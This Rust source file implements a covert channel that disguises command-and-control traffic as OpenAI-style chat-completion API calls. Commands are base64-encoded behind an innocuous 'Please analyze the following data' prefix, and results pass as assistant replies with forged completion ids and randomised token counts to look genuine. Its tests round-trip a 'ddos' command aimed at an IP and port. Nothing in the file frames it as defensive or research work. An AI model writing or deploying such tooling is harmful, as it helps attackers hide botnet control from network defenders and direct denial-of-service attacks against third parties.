use serde::{Deserialize, Serialize};
use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};

const B64_ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
const COMMAND_PREFIX: &str = "Please analyze the following data:\n\n";

fn b64_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64_ALPHABET[((triple >> 18) & 0x3F) as usize] as char);
        out.push(B64_ALPHABET[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(B64_ALPHABET[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(B64_ALPHABET[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

fn b64_decode(s: &str) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
    let s = s.trim_end_matches('=');
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits: u32 = 0;
    for c in s.bytes() {
        let val = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            b'\n' | b'\r' | b' ' => continue,
            _ => return Err(format!("invalid base64 character: {}", c as char).into()),
        } as u32;
        buf = (buf << 6) | val;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Ok(out)
}

#[derive(Serialize, Deserialize, Clone)]
pub struct ChatMessage {
    pub role: String,
    pub content: String,
}

#[derive(Serialize, Deserialize)]
pub struct ChatCompletionRequest {
    pub model: String,
    pub messages: Vec<ChatMessage>,
    pub temperature: f32,
    pub max_tokens: u32,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct ChatCompletionChoice {
    pub index: u32,
    pub message: ChatMessage,
    pub finish_reason: String,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct ChatCompletionResponse {
    pub id: String,
    pub object: String,
    pub created: u64,
    pub model: String,
    pub choices: Vec<ChatCompletionChoice>,
    pub usage: TokenUsage,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct TokenUsage {
    pub prompt_tokens: u32,
    pub completion_tokens: u32,
    pub total_tokens: u32,
}

#[derive(Serialize, Deserialize)]
struct CommandPayload {
    id: usize,
    command: String,
    args: Vec<String>,
}

#[derive(Serialize, Deserialize)]
struct ResultPayload {
    id: usize,
    result: String,
}

pub fn encode_command(id: usize, command: &str, args: &[String]) -> ChatCompletionRequest {
    let payload = CommandPayload {
        id,
        command: command.to_string(),
        args: args.to_vec(),
    };
    let json = serde_json::to_vec(&payload).unwrap();
    let encoded = b64_encode(&json);

    ChatCompletionRequest {
        model: "gpt-4".to_string(),
        messages: vec![
            ChatMessage {
                role: "system".to_string(),
                content: "You are a helpful coding assistant.".to_string(),
            },
            ChatMessage {
                role: "user".to_string(),
                content: format!("{}{}", COMMAND_PREFIX, encoded),
            },
        ],
        temperature: 0.7,
        max_tokens: 2048,
    }
}

pub fn decode_command(
    req: &ChatCompletionRequest,
) -> Result<(usize, String, Vec<String>), Box<dyn Error + Send + Sync>> {
    let user_msg = req
        .messages
        .iter()
        .rev()
        .find(|m| m.role == "user")
        .ok_or("no user message found")?;

    let encoded = user_msg
        .content
        .strip_prefix(COMMAND_PREFIX)
        .ok_or("missing command prefix")?;

    let decoded = b64_decode(encoded)?;
    let payload: CommandPayload = serde_json::from_slice(&decoded)?;
    Ok((payload.id, payload.command, payload.args))
}

pub fn encode_result(id: usize, result: &str) -> ChatCompletionResponse {
    let payload = ResultPayload {
        id,
        result: result.to_string(),
    };
    let json = serde_json::to_vec(&payload).unwrap();
    let encoded = b64_encode(&json);

    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let mut rng_seed = [0u8; 8];
    let _ = getrandom::getrandom(&mut rng_seed);
    let rng_val = u64::from_le_bytes(rng_seed);
    let prompt_tokens = 50 + (rng_val % 151) as u32;
    let completion_tokens = 100 + ((rng_val >> 16) % 401) as u32;

    ChatCompletionResponse {
        id: format!("chatcmpl-{}", uuid::Uuid::new_v4()),
        object: "chat.completion".to_string(),
        created: now,
        model: "gpt-4".to_string(),
        choices: vec![ChatCompletionChoice {
            index: 0,
            message: ChatMessage {
                role: "assistant".to_string(),
                content: encoded,
            },
            finish_reason: "stop".to_string(),
        }],
        usage: TokenUsage {
            prompt_tokens,
            completion_tokens,
            total_tokens: prompt_tokens + completion_tokens,
        },
    }
}

pub fn decode_result(
    resp: &ChatCompletionResponse,
) -> Result<(usize, String), Box<dyn Error + Send + Sync>> {
    let choice = resp.choices.first().ok_or("no choices in response")?;
    let decoded = b64_decode(&choice.message.content)?;
    let payload: ResultPayload = serde_json::from_slice(&decoded)?;
    Ok((payload.id, payload.result))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn roundtrip_base64() {
        let data = b"hello world, this is a test of base64 encoding";
        let encoded = b64_encode(data);
        let decoded = b64_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }

    #[test]
    fn roundtrip_command() {
        let args = vec!["192.168.1.1".to_string(), "8080".to_string()];
        let req = encode_command(42, "ddos", &args);
        let (id, cmd, decoded_args) = decode_command(&req).unwrap();
        assert_eq!(id, 42);
        assert_eq!(cmd, "ddos");
        assert_eq!(decoded_args, args);
    }

    #[test]
    fn roundtrip_result() {
        let resp = encode_result(42, "operation completed");
        let (id, result) = decode_result(&resp).unwrap();
        assert_eq!(id, 42);
        assert_eq!(result, "operation completed");
    }
}
